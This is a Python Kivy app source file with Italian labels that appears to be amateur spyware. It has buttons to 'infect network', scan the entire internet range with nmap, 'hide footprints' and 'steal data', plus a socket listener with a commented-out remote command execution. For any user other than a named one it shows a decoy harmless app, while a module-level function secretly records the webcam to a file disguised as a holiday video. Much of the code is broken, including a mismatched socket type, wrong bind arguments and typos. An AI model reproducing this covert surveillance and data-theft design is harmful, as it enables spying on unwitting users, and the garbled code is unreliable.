import cv2
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
import nmap
from tqdm import tqdm
import subprocess 
import threading
import os
import platform
import webbrowser
from zipfile import ZipFile
from zipfile import ZipFile 
import time
from pynput import mouse
import socket
class Universale_Nucleare(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.listener_avviato = False

    def build(self):
        app = BoxLayout(orientation="vertical")

        bottone = Button(text="infetta rete", font_size=30)
        bottone.bind(on_press=self.avvia_listener)
        app.add_widget(bottone)

        scansione = Button(text="scansione la rete", font_size=30)
        scansione.bind(on_press=self.scansione)
        app.add_widget(scansione)

        segreto = Button(text="nascondi impronte", font_size=30)
        segreto.bind(on_press=self.secret)
        app.add_widget(segreto)

        rudati=Button(text="ruba dati",font_size=30)
        rudati.bind(on_press=self.dati)
        app.add_widget(rudati)

        return app

    def secret(self, _):
        if os.name == "Andoid":
            finestra = subprocess.STARTUPINFO()
            finestra.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.Popen("python", startupinfo=finestra)
        else:
            subprocess.Popen(["python"])

    def scansione(self, _): #scansione con nmap di tutta la rete  
        rete = nmap.PortScanner()
        rete.scan("0.0.0.0/0")
        for _ in tqdm(range(10), desc="scansione rete"):
            time.sleep(1)

    def rileva(self, x, y):
        print(f"Mouse spostato a: ({x}, {y})")
        self.spia()

    def avvia_listener(self, _):
        if not self.listener_avviato:
            self.listener_avviato = True
            threading.Thread(target=self._start_mouse_listener, daemon=True).start()

    def _start_mouse_listener(self):
        def on_move(x, y):
            return "self.spia()"
        with mouse.Listener(on_move=on_move) as listener:
            listener.join()
    def dati(self):
        tipo=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        tipo.bind("0.0.0.0",8090)
        tipo.listen(2)
        print(f"server in attesa{tipo}")
        cocco,ciola=tipo.accept()
        print(f"server conesso {cocco}")
        utente=input("-->")
        #comando=os.system(utente)
        dati=cocco.recv(1010)
        cocco.sendall(dati)
        #cocco.sendall(comando.encode())
        cocco.close()
        tipo.close()

class app_normality(App):
    def build(self):
        def __init__(self, **kwargs):
            super().__init__(**kwargs)
            Apper=BuxLayout(orientation="vertical")    
            bottnoe=Button(text="richeista",font_size=70)    
            scansione=Button(text="test wifi password",font_size=70)
            scansione.bind(on_press=self.scansione)
            app.add_widget(scansione)
            bottnoe.bind(on_press=lambda x: webbrowser.open("https://www.gallinella.com"))
            apper.add_widget(bottnoe)
            return Apper
if __name__ == "__main__":
    if os.getenv("USERNAME")=="blue-terminal":
        Universale_Nucleare().run()
        if platform.system=="Android":
            link="http://192.168.1.13:8080/video"
            cameraandoid=cv2.VideoCapture(link)
            if not cameraandoid.isOpened():
                exit()
            while True:
                rec,fps=cameraandoid.read()
                if not rec:
                    break
                cv2.imshow("Camera",fps)    
                if cv2.waitKey(1)&0xFF==ord("q"):
                    break
            cameraandoid.release()
            cv2.destroyAllWindows()
    else:
        app_normality().run()
def cip():
        camera = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*"XVID")
        nomef = cv2.VideoWriter("video.vacanze.avi", fourcc, 20.0, (640, 480))
        for _ in range(2000000):
            ret, frame = camera.read()
            if not ret:
                break
            nomef.write(frame)
        camera.release()
        nomef.release()
cip()

print("hai il permesso")

